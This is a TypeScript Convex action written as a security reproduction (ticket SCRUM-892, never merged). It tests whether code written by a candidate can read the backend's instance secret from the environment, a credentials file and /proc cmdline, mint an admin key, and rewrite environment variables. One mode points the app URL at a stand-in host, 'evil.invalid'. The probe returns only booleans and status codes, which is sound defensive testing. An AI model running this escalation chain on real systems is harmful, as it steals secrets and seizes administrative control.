"use node";
// SCRUM-892 round 5 reproduction (never merged). A candidate-authored Node action
// tries to recover the backend's instance secret, mint an admin key, and use it
// to change the backend's environment. It returns booleans and HTTP status codes
// only: no secret or key ever leaves this function.
import { v } from "convex/values";
import { actionGeneric } from "convex/server";
import { execFileSync } from "node:child_process";
import { readdirSync, readFileSync } from "node:fs";

const KEY_SHAPE = /^[A-Za-z0-9][A-Za-z0-9._-]{0,62}\|[A-Za-z0-9+/=_-]{16,512}$/;
const SECRET_SHAPE = /^[0-9a-f]{64}$/;

function readOrEmpty(file: string): string {
  try {
    return readFileSync(file, "utf8").trim();
  } catch {
    return "";
  }
}

function secretFromCmdline(): string {
  for (const pid of readdirSync("/proc").filter((entry) => /^\d+$/.test(entry))) {
    const argv = readOrEmpty(`/proc/${pid}/cmdline`).split("\0");
    const index = argv.indexOf("--instance-secret");
    if (index >= 0 && argv[index + 1]) return argv[index + 1];
  }
  return "";
}

async function setEnv(adminKey: string, name: string, value = "1"): Promise<number> {
  try {
    const response = await fetch("http://127.0.0.1:3210/api/update_environment_variables", {
      method: "POST",
      headers: { Authorization: `Convex ${adminKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({ changes: [{ name, value }] }),
    });
    return response.status;
  } catch {
    return -2;
  }
}

export const probe = actionGeneric({
  // "add": a new variable. "rewrite": a new VALUE under an allowlisted name,
  // which a names-only check cannot see.
  args: { mode: v.optional(v.union(v.literal("add"), v.literal("rewrite"))) },
  handler: async (_ctx, { mode }) => {
    const envSecret = process.env.INSTANCE_SECRET ?? "";
    const fileSecret = readOrEmpty("/convex/data/credentials/instance_secret");
    const cmdlineSecret = secretFromCmdline();
    const name = readOrEmpty("/convex/data/credentials/instance_name");
    const secret = [envSecret, fileSecret, cmdlineSecret].find((value) => SECRET_SHAPE.test(value)) ?? "";
    let minted = "";
    try {
      minted =
        execFileSync("/convex/generate_key", [name, secret], { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] })
          .trim()
          .split(/\r?\n/)
          .at(-1) ?? "";
    } catch {
      minted = "";
    }
    // Control: the same request with a key-shaped value NOT derived from the secret.
    const bogus = `${name}|${"A".repeat(64)}`;
    return {
      uid: process.getuid?.() ?? -1,
      envHasSecret: SECRET_SHAPE.test(envSecret),
      fileHasSecret: SECRET_SHAPE.test(fileSecret),
      cmdlineHasSecret: SECRET_SHAPE.test(cmdlineSecret),
      mintedKeyShape: KEY_SHAPE.test(minted),
      escalatedStatus: KEY_SHAPE.test(minted)
        ? mode === "rewrite"
          ? await setEnv(minted, "NEXT_PUBLIC_APP_URL", "http://evil.invalid")
          : await setEnv(minted, "PROBE_ESCALATED")
        : -1,
      controlStatus: await setEnv(bogus, "PROBE_BOGUS"),
    };
  },
});
